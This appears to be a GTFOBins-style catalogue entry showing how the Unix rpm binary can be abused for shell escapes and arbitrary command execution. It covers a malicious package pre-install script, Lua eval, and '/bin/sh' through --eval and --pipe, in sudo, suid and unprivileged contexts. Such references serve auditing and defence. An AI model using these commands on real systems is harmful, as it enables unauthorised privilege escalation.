---
type: gtfobin
name: rpm
platform: Unix
functions: [command, inherit, shell]
tags: [gtfobin, unix, lotl]
---

# rpm

## command

```bash
rpm -ivh x-1.0-1.noarch.rpm
```
_Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install x.sh .
```_
**Contexts:** sudo

## inherit

```bash
rpm --eval '%{lua:...}'
```
_This allows to run Lua code (`...`)._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
rpm --eval '%(/bin/sh 1>&2)'
```
**Contexts:** sudo, suid, unprivileged

```bash
rpm --pipe '/bin/sh 0<&1'
```
**Contexts:** sudo, suid, unprivileged
